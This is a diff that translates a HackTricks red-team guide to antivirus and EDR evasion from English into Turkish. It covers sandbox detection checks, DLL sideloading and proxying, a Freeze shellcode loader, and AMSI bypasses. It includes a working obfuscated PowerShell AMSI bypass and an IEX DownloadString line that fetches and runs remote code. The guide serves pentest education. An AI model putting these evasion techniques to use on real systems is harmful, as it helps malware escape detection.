@@ -1,109 +1,98 @@
-# Antivirus (AV) Bypass
+# Antivirüs (AV) Atlama
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>
 
-Other ways to support HackTricks:
+HackTricks'ı desteklemenin diğer yolları:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Şirketinizi HackTricks'te reklam vermek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
+* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.
 
 </details>
 
-**This page was written by** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**
+**Bu sayfa** [**@m2rc\_p**](https://twitter.com/m2rc\_p)** tarafından yazılmıştır!**
 
-## **AV Evasion Methodology**
+## **AV Atlama Metodolojisi**
 
-Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.
+Şu anda, AV'ler bir dosyanın zararlı olup olmadığını kontrol etmek için farklı yöntemler kullanır: statik tespit, dinamik analiz ve daha gelişmiş EDR'ler için davranış analizi.
 
-### **Static detection**
+### **Statik tespit**
 
-Static detection is achieved by flagging known malicious strings or arrays of bytes in a binary or script, and also extracting information from the file itself (e.g. file description, company name, digital signatures, icon, checksum, etc.). This means that using known public tools may get you caught more easily, as they've probably been analyzed and flagged as malicious. There are a couple of ways of getting around this sort of detection:
+Statik tespit, bir ikili veya komut dosyasındaki bilinen zararlı dizeleri veya baytlarını işaretleyerek ve ayrıca dosyanın kendisinden bilgi çıkararak (örneğin, dosya açıklaması, şirket adı, dijital imzalar, simge, kontrol toplamı vb.) elde edilir. Bu, bilinen genel araçları kullanmanın sizi daha kolay yakalayabileceği anlamına gelir, çünkü muhtemelen analiz edilmiş ve zararlı olarak işaretlenmişlerdir. Bu tür bir tespiti atlatmanın birkaç yolu vardır:
 
-* **Encryption**
+* **Şifreleme**
 
-If you encrypt the binary, there will be no way for AV of detecting your program, but you will need some sort of loader to decrypt and run the program in memory.
+Eğer ikiliyi şifrelerseniz, AV'nin programınızı tespit etme şansı olmayacaktır, ancak programı bellekte şifre çözme ve çalıştırma için bir yükleyiciye ihtiyacınız olacaktır.
 
-* **Obfuscation**
+* **Gizleme**
 
-Sometimes all you need to do is change some strings in your binary or script to get it past AV, but this can be a time-consuming task depending on what you're trying to obfuscate.
+Bazen yapmanız gereken tek şey, ikili veya komut dosyanızdaki bazı dizeleri değiştirmek, böylece AV'yi atlatmak mümkün olabilir, ancak bunu gizlemek istediğiniz şeye bağlı olarak zaman alıcı bir görev olabilir.
 
-* **Custom tooling**
+* **Özel araçlar**
 
-If you develop your own tools, there will be no known bad signatures, but this takes a lot of time and effort.
-
-{% hint style="info" %}
-A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.
-{% endhint %}
-
-I highly recommend you check out this [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) about practical AV Evasion.
-
-### **Dynamic analysis**
-
-Dynamic analysis is when the AV runs your binary in a sandbox and watches for malicious activity (e.g. trying to decrypt and read your browser's passwords, performing a minidump on LSASS, etc.). This part can be a bit trickier to work with, but here are some things you can do to evade sandboxes.
-
-* **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.
-* **Checking machine's resources** Usually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even the fan speeds, not everything will be implemented in the sandbox.
-* **Machine-specific checks** If you want to target a user who's workstation is joined to the "contoso.local" domain, you can do a check on the computer's domain to see if it matches the one you've specified, if it doesn't, you can make your program exit.
-
-It turns out that Microsoft Defender's Sandbox computername is HAL9TH, so, you can check for the computer name in your malware before detonation, if the name matches HAL9TH, it means you're inside defender's sandbox, so you can make your program exit.
-
-<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
-
-Some other really good tips from [@mgeeky](https://twitter.com/mariuszbit) for going against Sandboxes
-
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>
-
-As we've said before in this post, **public tools** will eventually **get detected**, so, you should ask yourself something:
-
-For example, if you want to dump LSASS, **do you really need to use mimikatz**? Or could you use a different project which is lesser known and also dumps LSASS.
-
-The right answer is probably the latter. Taking mimikatz as an example, it's probably one of, if not the most flagged piece of malware by AVs and EDRs, while the project itself is super cool, it's also a nightmare to work with it to get around AVs, so just look for alternatives for what you're trying to achieve.
+Kendi araçlarınızı geliştirirseniz, bilinen kötü imzalar olmayacaktır, ancak bu çok zaman ve çaba gerektirir.
 
 {% hint style="info" %}
-When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.
+Windows Defender'ın statik tespitine karşı kontrol etmek için iyi bir yol [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)'dir. Bu, dosyayı birden çok segmente böler ve ardından Defender'a her birini ayrı ayrı taramasını ister, bu şekilde, ikili dosyanızdaki işaretlenmiş dizeleri veya baytları tam olarak söyleyebilir.
 {% endhint %}
 
-## EXEs vs DLLs
+Pratik AV Atlama hakkında bu [YouTube çalma listesini](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) kesinlikle kontrol etmenizi öneririm.
 
-Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).
+### **Dinamik analiz**
 
-As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.
+Dinamik analiz, AV'nin ikili dosyanızı bir kum havuzunda çalıştırması ve zararlı faaliyetleri izlemesi (örneğin, tarayıcınızın parolalarını şifre çözmeye ve okumaya çalışmak, LSASS üzerinde bir minidump yapmak vb.). Bu bölüm biraz daha karmaşık olabilir, ancak kum havuzlarını atlatabilmek için yapabileceğiniz bazı şeyler vardır.
 
-<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>
+* **Çalışmadan önce uyuma** Uygulamanın nasıl uygulandığına bağlı olarak, AV'nin dinamik analizini atlatmanın harika bir yoludur. AV'lerin dosyaları tarayabilmesi için çok kısa bir süreleri vardır, bu nedenle uzun süreli uyku kullanmak, ikili dosyaların analizini bozabilir. Ancak sorun şudur ki, birçok AV kum havuzları, uygulamanın nasıl uygulandığına bağlı olarak uykuyu atlayabilir.
+* **Makinenin kaynaklarını kontrol etme** Genellikle Kum havuzlarının çalışması için çok az kaynakları vardır (örneğin, <2GB RAM), aksi takdirde kullanıcının makinesini yavaşlatabilirler. Burada çok yaratıcı olabilirsiniz, örneğin CPU'nun sıcaklığını veya hatta fan hızlarını kontrol ederek, her şey kum havuzunda uygulanmayabilir.
+* **Makineye özgü kontroller** "contoso.local" alanına katılmış bir iş istasyonuna hedeflenmek istiyorsanız, bilgisayarın alanını kontrol ederek belirttiğinizle eşleşip eşleşmediğini kontrol edebilirsiniz, eşleşmiyorsa programınızı sonlandırabilirsiniz.
 
-Now we'll show some tricks you can use with DLL files to be much more stealthier.
+Microsoft Defender'ın Kum havuzu bilgisayar adının HAL9TH olduğu ortaya çıktı, bu yüzden zararlı yazılımınızı patlatmadan önce bilgisayar adını kontrol edebilirsiniz, eğer ad HAL9TH ile eşleşiyorsa, bu, Defender'ın kum havuzunda olduğunuz anlamına gelir, bu yüzden programınızı sonlandırabilirsiniz.
 
-## DLL Sideloading & Proxying
+<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
-**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.
+[@mgeeky](https://twitter.com/mariuszbit)'den Kum havuzlarına karşı bazı gerçekten iyi ipuçları
 
-You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanalı</p></figcaption></figure>
+
+Bu gönderide daha önce söylediğimiz gibi, **genel araçlar** sonunda **tespit edilecektir**, bu yüzden kendinize şunu sormalısınız:
+
+Örneğin, LSASS'ı dökmek istiyorsanız, **gerçekten mimikatz kullanmanız mı gerekiyor**? Yoksa daha az bilinen ve aynı şekilde LSASS'ı döken farklı bir projeyi mi kullanabilirsiniz?
+
+Doğru cevap muhtemelen ikincisidir. Mimikatz'ı bir örnek olarak alırsak, muhtemelen AV'ler ve EDR'ler tarafından en çok işaretlenen zararlı yazılım parçalarından biridir, projenin kendisi süper harika olsa da, AV'leri atlatabilmek için onunla çalışmak da bir kabus olabilir, bu yüzden elde etmek istediğiniz sonuca ulaşmak için alternatiflere bakın.
+
+{% hint style="info" %}
+Atlama için yüklerinizi değiştirirken, lütfen Defender'da **otomatik örnek göndermeyi kapatmayı** ve lütfen, ciddi anlamda, **VIRUSTOTAL'E YÜKLEMEYİNİZ**. Eğer amacınız uzun vadede atlama elde etmekse, yükünüzün belirli bir AV tarafından tespit edilip edilmediğini kontrol etmek istiyorsanız, bunu bir sanal makineye yükleyin, otomatik örnek göndermeyi kapatmaya çalışın ve sonuçtan memnun kalana kadar orada test edin.
+{% endhint %}
+
+##
+## DLL Yan Yükleme ve Proxy
+
+**DLL Yan Yükleme**, yükleyici tarafından kullanılan DLL arama sırasından faydalanır ve hem kurban uygulamasını hem de kötü amaçlı yükleri birlikte konumlandırır.
+
+DLL Yan Yükleme'ye duyarlı programları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell komut dosyasını kullanarak kontrol edebilirsiniz:
 
 {% code overflow="wrap" %}
 ```powershell
 Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
-    $binarytoCheck = "C:\Program Files\" + $_
-    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
+$binarytoCheck = "C:\Program Files\" + $_
+C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
 }
 ```
-{% endcode %}
+Bu komut, "C:\Program Files\\" içinde DLL hijacking'e duyarlı olan programların listesini ve yüklemeye çalıştıkları DLL dosyalarını çıktı olarak verecektir.
 
-This command will output the list of programs susceptible to DLL hijacking inside "C:\Program Files\\" and the DLL files they try to load.
+DLL Hijackable/Sideloadable programları kendiniz keşfetmenizi şiddetle öneririm, bu teknik doğru bir şekilde uygulandığında oldukça gizlidir, ancak genel olarak bilinen DLL Sideloadable programlarını kullanırsanız, kolayca yakalanabilirsiniz.
 
-I highly recommend you **explore DLL Hijackable/Sideloadable programs yourself**, this technique is pretty stealthy done properly, but if you use publicly known DLL Sideloadable programs, you may get caught easily.
+Sadece bir programın yüklemeyi beklediği bir DLL ile kötü niyetli bir DLL yerleştirmek, yüklemeniz gerçekleşmeyecektir, çünkü program, bu DLL içinde belirli bazı işlevleri beklemektedir. Bu sorunu çözmek için, başka bir teknik olan **DLL Proxying/Forwarding** kullanacağız.
 
-Just by placing a malicious DLL with the name a program expects to load, won't load your payload, as the program expects some specific functions inside that DLL, to fix this issue, we'll use another technique called **DLL Proxying/Forwarding**.
+**DLL Proxying**, programın proxy (ve kötü niyetli) DLL'den yaptığı çağrıları orijinal DLL'ye yönlendirir, böylece programın işlevselliğini korur ve yüklemenizin gerçekleşmesini sağlar.
 
-**DLL Proxying** forwards the calls a program makes from the proxy (and malicious) DLL to the original DLL, thus preserving the program's functionality and being able to handle the execution of your payload.
+[@flangvik](https://twitter.com/Flangvik/) tarafından [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini kullanacağım.
 
-I will be using the [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project from [@flangvik](https://twitter.com/Flangvik/)
-
-These are the steps I followed:
+Aşağıdaki adımları takip ettim:
 
 {% code overflow="wrap" %}
 ```
@@ -114,7 +103,7 @@ These are the steps I followed:
 ```
 {% endcode %}
 
-The last command will give us 2 files: a DLL source code template, and the original renamed DLL.
+Son komut bize 2 dosya verecektir: bir DLL kaynak kodu şablonu ve orijinal adı değiştirilmiş DLL.
 
 <figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
 
@@ -124,74 +113,72 @@ The last command will give us 2 files: a DLL source code template, and the origi
 ```
 {% endcode %}
 
-These are the results:
+İşte sonuçlar:
 
 <figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>
 
-Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.
+Hem shellcode'umuz (SGN ile kodlanmış) hem de proxy DLL, [antiscan.me](https://antiscan.me) sitesinde 0/26 tespit oranına sahiptir! Bunu bir başarı olarak adlandırabilirim.
 
 <figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG\_WNpE) to learn more about what we've discussed more in-depth.
+DLL Sideloading hakkında daha fazla bilgi edinmek için [S3cur3Th1sSh1t'in twitch VOD](https://www.twitch.tv/videos/1644171543) videosunu ve [ippsec'in videosunu](https://www.youtube.com/watch?v=3eROsG\_WNpE) izlemenizi **şiddetle tavsiye ederim**.
 {% endhint %}
 
 ## [**Freeze**](https://github.com/optiv/Freeze)
 
-`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`
+`Freeze, askıya alınmış işlemler, doğrudan sistem çağrıları ve alternatif yürütme yöntemleri kullanarak EDR'leri atlatmak için bir yük araç setidir`
 
-You can use Freeze to load and execute your shellcode in a stealthy manner.
-
+Freeze'yi, shellcode'unuzu gizli bir şekilde yüklemek ve yürütmek için kullanabilirsiniz.
 ```
 Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
 1. Generate some shellcode, in this case I used Havoc C2.
 2. ./Freeze -I demon.bin -encrypt -O demon.exe
 3. Profit, no alerts from defender
 ```
-
 <figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-Evasion is just a cat & mouse game, what works today could be detected tomorrow, so never rely on only one tool, if possible, try chaining multiple evasion techniques.
+Evasion sadece bir kedi ve fare oyunudur, bugün işe yarayan yarın tespit edilebilir, bu yüzden sadece bir araca güvenmeyin, mümkünse birden fazla kaçırma tekniğini birleştirmeyi deneyin.
 {% endhint %}
 
-## AMSI (Anti-Malware Scan Interface)
+## AMSI (Anti-Malware Tarama Arayüzü)
 
-AMSI was created to prevent "[fileless malware](https://en.wikipedia.org/wiki/Fileless\_malware)". Initially, AVs were only capable of scanning **files on disk**, so if you could somehow execute payloads **directly in-memory**, the AV couldn't do anything to prevent it, as it didn't have enough visibility.
+AMSI, "[dosyasız kötü amaçlı yazılım](https://en.wikipedia.org/wiki/Fileless\_malware)" önlemek için oluşturulmuştur. Başlangıçta, AV'ler yalnızca **diskteki dosyaları** tarama yeteneğine sahipti, bu yüzden payloads'ı **doğrudan bellekte** çalıştırabilirseniz, AV'nin bunu önlemek için yapabileceği bir şey yoktu, çünkü yeterli görünürlüğe sahip değildi.
 
-The AMSI feature is integrated into these components of Windows.
+AMSI özelliği, Windows'un bu bileşenlerine entegre edilmiştir.
 
-* User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
-* PowerShell (scripts, interactive use, and dynamic code evaluation)
-* Windows Script Host (wscript.exe and cscript.exe)
-* JavaScript and VBScript
-* Office VBA macros
+* Kullanıcı Hesap Denetimi veya UAC (EXE, COM, MSI veya ActiveX yükseltme)
+* PowerShell (komut dosyaları, etkileşimli kullanım ve dinamik kod değerlendirmesi)
+* Windows Script Host (wscript.exe ve cscript.exe)
+* JavaScript ve VBScript
+* Office VBA makroları
 
-It allows antivirus solutions to inspect script behavior by exposing script contents in a form that is both unencrypted and unobfuscated.
+Antivirüs çözümlerine, betik davranışını incelemelerine olanak tanır, betik içeriğini şifrelenmemiş ve şifrelenmemiş bir formda ortaya çıkarır.
 
-Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.
+`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` komutunu çalıştırmak, Windows Defender'da aşağıdaki uyarıyı üretecektir.
 
 <figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>
 
-Notice how it prepends `amsi:` and then the path to the executable from which the script ran, in this case, powershell.exe
+Dikkat edin, `amsi:` öne eklenir ve ardından betiğin çalıştığı yürütülebilir dosyanın yolu, bu durumda powershell.exe
 
-We didn't drop any file to disk, but still got caught in-memory because of AMSI.
+Diskte herhangi bir dosya bırakmadık, ancak hala AMSI nedeniyle bellekte yakalandık.
 
-There are a couple of ways to get around AMSI:
+AMSI'yi atlatmanın birkaç yolu vardır:
 
-* **Obfuscation**
+* **Obfuskasyon**
 
-Since AMSI mainly works with static detections, therefore, modifying the scripts you try to load can be a good way for evading detection.
+AMSI genellikle statik tespitlerle çalıştığından, yüklemeye çalıştığınız betikleri değiştirmek tespitten kaçınmanın iyi bir yol olabilir.
 
-However, AMSI has the capability of unobfuscating scripts even if it has multiple layers, so obfuscation could be a bad option depending on how it's done. This makes it not-so-straightforward to evade. Although, sometimes, all you need to do is change a couple of variable names and you'll be good, so it depends on how much something has been flagged.
+Ancak, AMSI, birden fazla katmana sahip olsa bile betikleri şifresini çözebilme yeteneğine sahiptir, bu nedenle obfuskasyon, nasıl yapıldığına bağlı olarak kötü bir seçenek olabilir. Bu, kaçınmanın o kadar da basit olmadığı anlamına gelir. Bununla birlikte, bazen yapmanız gereken tek şey birkaç değişken adını değiştirmek olabilir, bu yüzden ne kadar bir şeyin işaretlendiğine bağlıdır.
 
-* **AMSI Bypass**
+* **AMSI Atlama**
 
-Since AMSI is implemented by loading a DLL into the powershell (also cscript.exe, wscript.exe, etc.) process, it's possible to tamper with it easily even running as an unprivileged user. Due to this flaw in the implementation of AMSI, researchers have found multiple ways to evade AMSI scanning.
+AMSI, bir DLL'yi powershell (ayrıca cscript.exe, wscript.exe vb.) işlemine yükleyerek uygulanır, bu nedenle ayrıcalıklı olmayan bir kullanıcı olarak bile kolayca müdahale edilebilir. AMSI'nin uygulamasındaki bu kusur nedeniyle, araştırmacılar AMSI taramasını atlatmanın birden fazla yolunu bulmuşlardır.
 
-**Forcing an Error**
+**Hata Zorlama**
 
-Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
+AMSI başlatmasını başarısız kılmak (amsiInitFailed), mevcut işlem için hiç tarama başlatılmayacağı anlamına gelir. İlk olarak bu, [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklanmış ve Microsoft daha geniş kullanımı önlemek için bir imza geliştirmiştir.
 
 {% code overflow="wrap" %}
 ```powershell
@@ -199,206 +186,189 @@ Forcing the AMSI initialization to fail (amsiInitFailed) will result that no sca
 ```
 {% endcode %}
 
-All it took was one line of powershell code to render AMSI unusable for the current powershell process. This line has of course been flagged by AMSI itself, so some modification is needed in order to use this technique.
+AMSI'yi mevcut powershell işlemi için kullanılamaz hale getirmek için sadece bir satır powershell kodu gerekiyordu. Bu satır tabii ki AMSI tarafından işaretlendi, bu yüzden bu teknik kullanılmak için bazı değişiklikler gerekiyor.
 
-Here is a modified AMSI bypass I took from this [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
-
+İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) üzerinden aldığım değiştirilmiş AMSI bypass.
 ```powershell
 Try{#Ams1 bypass technic nº 2
-      $Xdatabase = 'Utils';$Homedrive = 'si'
-      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
-      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
-      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
-      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
-      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
-      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
-      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
-      $Spotfix.SetValue($null,$true)
-   }Catch{Throw $_}
+$Xdatabase = 'Utils';$Homedrive = 'si'
+$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
+$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
+$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
+$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
+$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
+$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
+$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
+$Spotfix.SetValue($null,$true)
+}Catch{Throw $_}
 ```
+**Bellekte Yama Yapma**
 
-Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.
-
-**Memory Patching**
-
-This technique was initially discovered by [@RastaMouse](https://twitter.com/\_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E\_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.
+Bu teknik başlangıçta [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedildi ve kullanıcı tarafından sağlanan girişi tarayan amsi.dll'deki "AmsiScanBuffer" işlevinin adresini bulmayı ve bunu E\_INVALIDARG kodu için geri döndürecek talimatlarla üzerine yazmayı içerir. Bu şekilde, gerçek taramanın sonucu temiz bir sonuç olarak yorumlanan 0 olarak dönecektir.
 
 {% hint style="info" %}
-Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.
+Daha detaylı bir açıklama için [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) adresini okuyun.
 {% endhint %}
 
-There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/#amsi-bypass) and [this repo](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.
+AMSI'yi powershell ile atlatmak için kullanılan birçok başka teknik de vardır, bunlar hakkında daha fazla bilgi edinmek için [**bu sayfayı**](basic-powershell-for-pentesters/#amsi-bypass) ve [bu repo](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) adresini kontrol edin.
 
-Or this script taht via memory patching will patch each new Powersh
+Veya bellek yaması aracılığıyla her yeni Powershell betiğini yamalayan bu betik
 
-## Obfuscation
+## Obfuskasyon
 
-There are several tools that can be used to **obfuscate C# clear-text code**, generate **metaprogramming templates** to compile binaries or **obfuscate compiled binaries** such as:
+C# açık metin kodunu **obfuskasyon** yapmak, derlemeleri derlemek için **metaprogramlama şablonları** oluşturmak veya derlenmiş derlemeleri **obfuskasyon** yapmak için kullanılabilecek birkaç araç vardır:
 
-* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
-* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): The aim of this project is to provide an open-source fork of the [LLVM](http://www.llvm.org/) compilation suite able to provide increased software security through [code obfuscation](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) and tamper-proofing.
-* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstates how to use `C++11/14` language to generate, at compile time, obfuscated code without using any external tool and without modifying the compiler.
-* [**obfy**](https://github.com/fritzone/obfy): Add a layer of obfuscated operations generated by the C++ template metaprogramming framework which will make the life of the person wanting to crack the application a little bit harder.
-* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is a x64 binary obfuscator that is able to obfuscate various different pe files including: .exe, .dll, .sys
-* [**metame**](https://github.com/a0rtega/metame): Metame is a simple metamorphic code engine for arbitrary executables.
-* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is a fine-grained code obfuscation framework for LLVM-supported languages using ROP (return-oriented programming). ROPfuscator obfuscates a program at the assembly code level by transforming regular instructions into ROP chains, thwarting our natural conception of normal control flow.
-* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is a .NET PE Crypter written in Nim
-* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor is able to convert existing EXE/DLL into shellcode and then load them
+* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuskatörü**
+* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu proje, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynak bir çatalını sağlayarak [kod obfuskasyonu](http://en.wikipedia.org/wiki/Obfuscation_(software)) ve değiştirilemezlik aracılığıyla artırılmış yazılım güvenliği sağlamayı amaçlamaktadır.
+* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, derleyiciyi değiştirmeden ve harici bir araç kullanmadan, derleme zamanında obfuskasyonlu kod üretmek için `C++11/14` dilini nasıl kullanacağını gösterir.
+* [**obfy**](https://github.com/fritzone/obfy): Uygulamayı kırmak isteyen kişinin işini biraz zorlaştıracak olan C++ şablon metaprogramlama çerçevesi tarafından oluşturulan obfuskasyonlu işlemler katmanı ekleyin.
+* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll, .sys gibi çeşitli farklı pe dosyalarını obfuskasyon yapabilen bir x64 ikili obfuskatördür.
+* [**metame**](https://github.com/a0rtega/metame): Metame, herhangi bir yürütülebilir dosya için basit bir metamorfik kod motorudur.
+* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanarak LLVM destekli diller için ince taneli bir kod obfuskasyon çerçevesidir. ROPfuscator, düzenli talimatları ROP zincirlerine dönüştürerek bir programı derleme kodu düzeyinde obfuskasyon yapar ve normal kontrol akışımızı engeller.
